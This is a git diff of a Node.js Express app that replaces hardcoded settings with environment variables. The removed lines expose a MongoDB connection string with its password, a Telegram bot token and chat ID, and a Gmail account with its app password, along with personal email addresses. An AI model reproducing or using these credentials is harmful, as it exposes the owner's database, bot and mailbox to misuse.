@@ -4,10 +4,10 @@ const bodyParser = require('body-parser');
 const axios = require('axios');
 const mongoose = require('mongoose');
 const nodemailer = require('nodemailer');
-
+require('dotenv').config(); // Load environment variables from .env
 
 const app = express();
-const PORT = 3000;
+const PORT = process.env.PORT || 3000;
 
 // Middleware to parse incoming request bodies
 app.use(bodyParser.urlencoded({ extended: true }));
@@ -27,7 +27,7 @@ app.get('/', (req, res) => {
 // MongoDB connection function
 const connectDB = async () => {
     try {
-        await mongoose.connect('mongodb+srv://hostingweb021:xvsfR6i8FvKVX1Ab@cluster1.dfy0p.mongodb.net/', {
+        await mongoose.connect(process.env.MONGODB_URI, {
             useNewUrlParser: true,
             useUnifiedTopology: true,
             dbName: 'users'
@@ -234,10 +234,9 @@ app.post('/telegram-callback', async (req, res) => {
 
 // Function to send message to Telegram
 const sendMessageToTelegram = async (message, inlineKeyboard = {}) => {
-    const url = `https://api.telegram.org/bot7418584036:AAEmk0bynA7D4D4fOdfa6idYVybsiltwv4g/sendMessage`;
+    const url = `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`;
     await axios.post(url, {
-
-       chat_id: 6236066117,
+        chat_id: process.env.CHAT_ID,
         text: message,
         ...inlineKeyboard // Spread the inline keyboard object into the request body
     });
@@ -247,8 +246,8 @@ const sendMessageToTelegram = async (message, inlineKeyboard = {}) => {
 const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-      user: 'm.mohamed.shinan@gmail.com',      // Your email address
-      pass: 'llim qstw ncfd gofv'   // Your email password or app password
+      user: process.env.EMAIL,      // Your email address
+      pass: process.env.EMAIL_PASS   // Your email password or app password
     }
   });
   
@@ -257,8 +256,8 @@ const transporter = nodemailer.createTransport({
     const { FirstName, PhoneNumber, message } = req.body;
   
     const mailOptions = {
-      from: 'm.mohamed.shinan@gmail.com',        // "from" address is the sender's email
-      to: 'mohamedshinan069@gmail.com',         // "to" address is the recipient's email
+      from: process.env.EMAIL,        // "from" address is the sender's email
+      to: process.env.EMAIL2,         // "to" address is the recipient's email
       subject: 'Form Submission',
       text: `First Name: ${FirstName}\nPhone Number: ${PhoneNumber}\nMessage: ${message}`
     };
